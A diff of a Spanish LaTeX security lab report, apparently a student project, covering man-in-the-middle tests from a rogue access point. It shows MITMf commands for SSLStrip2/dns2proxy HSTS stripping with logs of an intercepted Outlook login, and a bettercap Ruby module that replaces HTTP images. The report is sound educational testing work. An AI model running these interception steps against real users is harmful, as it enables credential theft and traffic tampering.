@@ -380,44 +380,82 @@ ejemplo, imágenes que explicitan que la seguridad de la app fue vulnerada, lo m
 utilizarla hasta, al menos, tener algo de información sobre el incidente y la regularización de la situación.
 
 
-\section{MITM}
+\subsection{MITM}
 
-El MitM (o Man-in-the-Middle) es un ataque en el que se adquiere la capacidad de leer, insertar y modificar a voluntad la información que esta en viaje. El atacante debe ser capaz de observar e interceptar mensajes entre las dos víctimas los mensajes entre dos partes sin que ninguna de ellas conozca que el enlace entre ellos ha sido violado. 
+El MitM (o Man-in-the-Middle) es un ataque en el que se adquiere la capacidad de leer, insertar y modificar a voluntad la información que 
+está en viaje. El atacante debe ser capaz de observar e interceptar mensajes entre las dos víctimas los mensajes entre dos partes sin que 
+ninguna de ellas conozca que el enlace entre ellos ha sido violado. 
 
-Para nuestro caso, utilizaremos un herramienta llamada MitMf, la cual es un framework que recopila varias herramientas conocidas (como ssltrip2 y dns2proxy) para permitirnos hacer este tipo de ataques. 
+Para nuestro caso, utilizaremos SSLStrip y una herramienta llamada MITMf, la cual es un framework que recopila varias herramientas conocidas 
+(como ssltrip2 y dns2proxy) para permitirnos hacer este tipo de ataques. PNuestra intención es poder capturar información que viaja en la red, 
+modificarla y analizar el posible impacto que puede tener en un escenario real. A continuación, enumeramos las pruebas realizadas:
 
-Nuestra intención con este framework es poder capturar información que viaja en la red y modificarla. A continuación, enumeramos las pruebas realizadas y los resultados que obtuvimos con la mismas.
+\begin{itemize}
+  \item Downgrade de conexiones HTTPS a HTTP con SSLStrip
+  \item Eliminando HSTS con SSLStrip2 y dns2proxy
+  \item Intercepción y modificación de imágenes por HTTP
+\end{itemize}
 
-Downgrade de conexiones HTTPS a HTTP con SSLStrip
+\subsubsection{Downgrade de conexiones HTTPS a HTTP con SSLStrip}
 
-Cuando nuestro dispositivo de prueba se conecta a alguna página que utiliza HTTPS, se genera una conexión segura que impide que podamos ver el tráfico real que esta en viaje para esa conexión. SSLStrip es una herramienta que permite quitar los headers https de la conexión y forzar a que la misma se realize por http. O sea, convierte todo lo que sea https:// en http://. De esta manera, si bien nosotros siempre vamos a querer conectarnos de manera segura por https a algún servicio o página web, SSLStrip nos fuerza a hacerlo de manera insegura.
+Cuando nuestro dispositivo de prueba se conecta a alguna página que utiliza HTTPS, se genera una conexión segura que impide que podamos ver el 
+tráfico real que está en viaje para esa conexión. \textbf{SSLStrip} es una herramienta que permite quitar los headers https de la conexión y forzar a 
+que la misma se realize por http. O sea, \textbf{convierte todo lo que sea https:// en http://}. De esta manera, si bien nosotros siempre vamos 
+a querer conectarnos de manera segura por https a algún servicio o página web, SSLStrip nos fuerza a hacerlo de manera insegura.
 
-Sin embargo, luego de realizar algunas pruebas con el mismo, nos dimos cuenta que no funciona tan bien como esperábamos, dado que es afectado en gran parte por los headers HSTS. HSTS (HTTP Strict Transport Security) es una política de seguridad web establecida para evitar ataques que puedan interceptar comunicaciones, cookies, etc. Según este mecanismo un servidor web declara que los navegadores solamente pueden interactuar con ellos mediante conexiones HTTPS. 
+\begin{wrapfigure}{r}{10cm}
+    \centering
+    \includegraphics[width=10cm]{img/hsts.png}
+    \caption{HSTS browser support}
+\end{wrapfigure}
 
-Al día de hoy la mayoría de los sitios de gran uso, como pueden ser Paypal, Gmail, Facebook, Twitter, Outlook, etcétera, utilizan el header HSTS para que los navegadores que lo soportan, que a día de hoy son todos, sepan que cuando el usuario introduzca el dominio en la barra de direcciones sin especificar el protocolo, se debe acceder siempre a través de HTTPS. De este modo, nunca se realizará una petición HTTP a un dominio que use HSTS y evitará que un atacante en medio puedo hacer un esquema de SSLStrip. Es por esto, si bien SSLStrip reemplaza por http://, el navegador vuelve a forzarlo a https:// gracias a este header, por lo que nuestra pruebas con esta herramienta no fueron para nada interesantes.
+Sin embargo, luego de realizar algunas pruebas con el mismo, nos dimos cuenta que no funciona tan bien como esperábamos, dado que es afectado 
+en gran parte por los headers HSTS. \textbf{HSTS (HTTP Strict Transport Security) es una política de seguridad web} establecida para evitar ataques 
+que puedan interceptar comunicaciones, cookies, etc. Según este mecanismo \textbf{un servidor web declara que los navegadores solamente pueden 
+interactuar con ellos mediante conexiones HTTPS}. 
 
-Eliminando HSTS con SSLStrip2 y dns2proxy
+Al día de hoy la mayoría de los sitios de gran uso, como pueden ser Paypal, Gmail, Facebook, Twitter, Outlook, etcétera, utilizan el header 
+HSTS para que los navegadores que lo soportan, que a día de hoy son todos los modernos, sepan que cuando el usuario introduzca el dominio en la barra de 
+direcciones sin especificar el protocolo, se debe acceder siempre a través de HTTPS. De este modo, nunca se realizará una petición HTTP a un 
+dominio que use HSTS y evitará que un atacante en medio puedo hacer un esquema de SSLStrip. Es por esto, si bien SSLStrip reemplaza por 
+http://, el navegador vuelve a forzarlo a https:// gracias a este header, por lo que nuestra pruebas con esta herramienta no fueron para 
+nada interesantes.
 
-Para resolver este problema que tenemos con el header HSTS, vamos a utilizar la nueva versión de SSLStrip, llamada SSLStrip2 o SSLStrip+, en conjunto con dns2proxy. Estos nos permitirán quitar todo header HSTS que se pueda aparecer en los headers de las conexiones (SSLStrip2) y nos redireccionarán a un dominio falso que se haga pasar por el verdadero pero que funcione sobre HTTP para poder capturar el tráfico (dns2proxy). Para realizar esto configuramos que el domino outlook.live.com que nos permite ingresar a nuestras cuentas de outlook o hotmail personales, sea redirigido a weboutlook.live.com. 
+\subsubsection{Eliminando HSTS con SSLStrip2 y dns2proxy}
 
-Pusimos a correr nuestro rogue AP, desactivamos el dns que nos provee dnsmasq, y luego pusimos a correr MitMf con las opciones de hsts (SSLStrip2) y dns (dns2proxy) de la siguiente manera:
+Para resolver este problema que tenemos con el header HSTS, vamos a utilizar la nueva versión de SSLStrip, llamada SSLStrip2 o SSLStrip+, en conjunto
+con dns2proxy. Estos nos permitirán quitar todo header HSTS que se pueda aparecer en los headers de las conexiones (SSLStrip2) y nos 
+redireccionarán a un dominio falso que se haga pasar por el verdadero pero que funcione sobre HTTP para poder capturar el tráfico (dns2proxy). 
+Por default, MITMf viene configurado para hacer esto con algunos dominios, por ejemplo, con outlook.live.com, el cual nos permite ingresar a nuestras 
+cuentas de outlook o hotmail personales, generando una redirección a weboutlook.live.com, que es un dominio falso creado por dns2proxy para hacerse pasar
+como la página real pero que este sobre HTTP. 
 
-python mitmf.py -i wlan0 --hsts --dns
+Pusimos a correr nuestro rogue AP, desactivamos el dns que nos provee dnsmasq, y luego pusimos a correr MitMf con las opciones de hsts 
+(SSLStrip2) y dns (dns2proxy) de la siguiente manera:
+
+\begin{lstlisting}[style=base]
+  $ python mitmf.py -i wlan0 --hsts --dns
+\end{lstlisting}
 
 Luego, conectamos nuestro dispositivo de prueba al AP e intentamos acceder a outlook.com y estos fue lo que logueo mitmf:
 
-2017-11-25 17:29:20 10.0.0.168 [type:Chrome Mobile-62 os:Android] outlook.com
-2017-11-25 17:29:21 10.0.0.168 [DNS] Resolving 'wwww.outlook.com' to 'www.outlook.com' for HSTS bypass
-2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] www.outlook.com
-2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
-2017-11-25 17:29:21 10.0.0.168 [DNS] Resolving 'weboutlook.live.com' to 'outlook.live.com' for HSTS bypass
-2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] outlook.live.com
-2017-11-25 17:29:22 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
-2017-11-25 17:29:22 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
+\begin{lstlisting}[style=base]
+  2017-11-25 17:29:20 10.0.0.168 [type:Chrome Mobile-62 os:Android] outlook.com
+  2017-11-25 17:29:21 10.0.0.168 [DNS] Resolving 'wwww.outlook.com' to 'www.outlook.com' for HSTS bypass
+  2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] www.outlook.com
+  2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
+  2017-11-25 17:29:21 10.0.0.168 [DNS] Resolving 'weboutlook.live.com' to 'outlook.live.com' for HSTS bypass
+  2017-11-25 17:29:21 10.0.0.168 [type:Chrome Mobile-62 os:Android] outlook.live.com
+  2017-11-25 17:29:22 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
+  2017-11-25 17:29:22 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
+\end{lstlisting}
+  
+Como se puede ver, mitmf capturo los requests a outlook.live.com y lo termino redirigiendo a weboutlook.live.com el cual mantiene una conexión del 
+tipo HTTP pero se muestra como si fuera la página original para el usuario del dispositivo, y todos los requests que hagamos desde este dominio 
+dns2proxy los forwardea al dominio original para que la navegación y el comportamiento del sitio parezca real. 
 
-Como se puede ver, mitmf capturo los requests a outlook.live.com y lo termino redirigiendo a weboutlook.live.com el cual mantiene una conexión del tipo HTTP pero se muestra como si fuera la página original para el usuario del dispositivo, y todos los requests que hagamos desde este dominio dns2proxy los forwardea al dominio original para que la navegación y el comportamiento del sitio parezca real. 
-
-Paso siguiente, nos intentamos loguear al sitio poniendo nuestro email y un password erróneo para mostrar únicamente como capturamos el tráfico. A continuación se pueden ver los logs:
+Paso siguiente, nos intentamos loguear al sitio poniendo nuestro email y un password erróneo para mostrar únicamente como capturamos el tráfico. 
+A continuación se pueden ver los logs:
 
 \begin{lstlisting}[style=base]
   2017-11-25 17:30:45 10.0.0.168 [type:Chrome Mobile-62 os:Android] POST Data (login.live.com):
@@ -425,43 +463,58 @@ Paso siguiente, nos intentamos loguear al sitio poniendo nuestro email y un pass
   2017-11-25 17:30:45 10.0.0.168 [type:Chrome Mobile-62 os:Android] Zapped a strict-transport-security header
   2017-11-25 17:30:46 10.0.0.168 [type:Chrome Mobile-62 os:Android] auth.gfx.ms
   2017-11-25 17:31:00 10.0.0.168 [type:Chrome Mobile-62 os:Android] POST Data (login.live.com):
-  i13=0&login=fedomartinez%40hotmail.com&loginfmt=fedomartinez%40hotmail.com&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=prueba&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&psFidoAllowList=&canary=&ctx=&PPFT=DQhHzeNTqKgxInlQhD31Nw0SsDGg7fJHgiMMlRv1h0E1CW%21Aa4LxVqOMMnjVW6PLiF9GhG%21OiSWI3hmjm7sieMn2*AysxGtCrV*OFOjsCncmhYVa*OLGWxKpw6wat5kyAk56pUr8xE*ac82nr6IWxvZ0XEIOqIHPMedKY2R2J*R47bzX34e7DNlSj1*lIXI6kAai7ZTgChw7YBHUQMyi%214cQTKAlGLTo28D*FPygvU%21EG0OSa*mPnRxBol1fRmNZ3s5Unh2dDJgoQzFwDnSDswE%24&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&i2=36&i17=0&i18=__ConvergedLoginPaginatedStrings%7C1%2C__ConvergedLogin_PCore%7C1%2C&i19=71540
+  i13=0&@login=fedomartinez%40hotmail.com@&loginfmt=fedomartinez%40hotmail.com&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&@passwd=prueba@&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&psFidoAllowList=&canary=&ctx=&PPFT=DQhHzeNTqKgxInlQhD31Nw0SsDGg7fJHgiMMlRv1h0E1CW%21Aa4LxVqOMMnjVW6PLiF9GhG%21OiSWI3hmjm7sieMn2*AysxGtCrV*OFOjsCncmhYVa*OLGWxKpw6wat5kyAk56pUr8xE*ac82nr6IWxvZ0XEIOqIHPMedKY2R2J*R47bzX34e7DNlSj1*lIXI6kAai7ZTgChw7YBHUQMyi%214cQTKAlGLTo28D*FPygvU%21EG0OSa*mPnRxBol1fRmNZ3s5Unh2dDJgoQzFwDnSDswE%24&PPSX=Pa&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&i2=36&i17=0&i18=__ConvergedLoginPaginatedStrings%7C1%2C__ConvergedLogin_PCore%7C1%2C&i19=71540
 \end{lstlisting}
 
-Claramente se puede ver que al generar una conexión HTTP a un dominio falso que se hace pasar por uno verdadero podemos interceptar información sensible que de otra manera no podríamos descifrar en una conexión HTTPS. En esta caso, tanto el mail como el password de nuestro dispositivo fueron comprometidos.
+Claramente se puede ver que al generar una conexión HTTP a un dominio falso que se hace pasar por uno verdadero podemos interceptar información 
+sensible que de otra manera no podríamos descifrar en una conexión HTTPS. En esta caso, tanto el mail como el password de nuestro dispositivo 
+fueron comprometidos.
 
-Intercepción y modificación de imágenes por HTTP
-Para esta prueba, decidimos utilizar bettercap para modificar requests de imágenes que viajan por tráfico HTTP y redigirlas a otra imagen que nosotros especifiquemos. En este caso, dado que no encontramos un plugin de bettercap que nos permita redirigir imágenes, decidimos crear el nuestro propio. A continuación el código del mismo:
+\subsubsection{Intercepción y modificación de imágenes por HTTP}
 
+Para esta prueba, decidimos utilizar \textbf{bettercap} para modificar requests de imágenes que viajan por tráfico HTTP y redigirlas a otra 
+imagen que nosotros especifiquemos. En este caso, dado que no encontramos un plugin de bettercap que nos permita redirigir imágenes, decidimos 
+crear el nuestro propio. A continuación el código del mismo:
 
-\begin{lstlisting}[language=ruby]
+\begin{lstlisting}[language=ruby,basicstyle=\ttfamily\color{white},commentstyle=\ttfamily\color{gray},keywordstyle=\ttfamily\color{orange},stringstyle=\color{green}]
+  # imageReplacer.rb
+
   # encoding: UTF-8
-  # redirecttocat.rb
-  
-  # This proxy module will redirect all images to a cat image.
-  class RedirectToCat < BetterCap::Proxy::HTTP::Module
-  meta(
-    'Name'        => 'RedirectToCat',
-    'Description' => 'This proxy module will redirect the target(s) images requests to a cat image.',
-    'Version'     => '1.0.0',
-    'Author'      => "Federico Martinez",
-    'License'     => 'GPL3'
+  # This proxy module will redirect all images to an image of our choice.
+
+  class ImageReplacer < BetterCap::Proxy::HTTP::Module
+    meta(
+      'Name'        => 'Pwnd',
+      'Description' => 'This proxy module will redirect the target(s) images requests to an image of our choice.',
+      'Version'     => '1.0.0',
+      'Author'      => "Federico Martinez",
+      'License'     => 'GPL3'
     )
-    
-    # Cat image URL
+
+    # Choosen image URL
     @@url = 'http://www.catster.com/wp-content/uploads/2017/08/A-fluffy-cat-looking-funny-surprised-or-concerned.jpg'
-    
+
     def on_request( request, response )
-    if response.content_type =~ /^image\/.*/ and !@@url.include?(request.host)
-    BetterCap::Logger.info "[#{'REDIRECT'.green}] Redirecting #{request.to_url} to cat ..."
-    response.redirect!(@@url)
+      if response.content_type =~ /^image\/.*/ and !@@url.include?(request.host)
+        BetterCap::Logger.info "[#{'REDIRECT'.green}] The requested image #{request.to_url} has been replaced! ..."
+        response.redirect!(@@url)
+      end
     end
-    end
-    end
+  end
 \end{lstlisting}
     
-Básicamente, este plugin captura todas las requests HTTP que devuelven imágenes y la convierte en una imagen de un gato que nosotros especificamos. Pusimos a correr bettercap de la siguiente manera sobre la interfaz de nuestro rogue AP:
+Básicamente, este plugin captura todas las requests HTTP que devuelven imágenes y la convierte en una imagen que nosotros especificamos. Pusimos 
+a correr bettercap de la siguiente manera sobre la interfaz de nuestro rogue AP:
 
-bettercap -I wlan0 --proxy-module redirecttocat.rb -T 10.0.0.168 -G 10.0.0.1 --no-spoofing
+\begin{lstlisting}[style=base]
+  $ bettercap -I wlan0 --proxy-module redirecttocat.rb -T 10.0.0.168 -G 10.0.0.1 --no-spoofing
+\end{lstlisting}
 
-Luego, utilizando aplicaciones como Spotify o Mercadolibre que utilizan requests HTTP inseguras para imágenes, pudimos obtener resultados como el siguiente al querer ver el carousel de imágenes de una publicación de mercadolibre:
+Luego, utilizando aplicaciones como Spotify o Mercadolibre que utilizan requests HTTP inseguras para imágenes, pudimos obtener resultados como 
+el siguiente al querer ver el carousel de imágenes de una publicación de mercadolibre:
+
+\begin{wrapfigure}{c}{10cm}
+    \centering
+    \includegraphics[width=10cm]{img/cat.png}
+    \caption{Imagen modificada en mercadolibre}
+\end{wrapfigure}
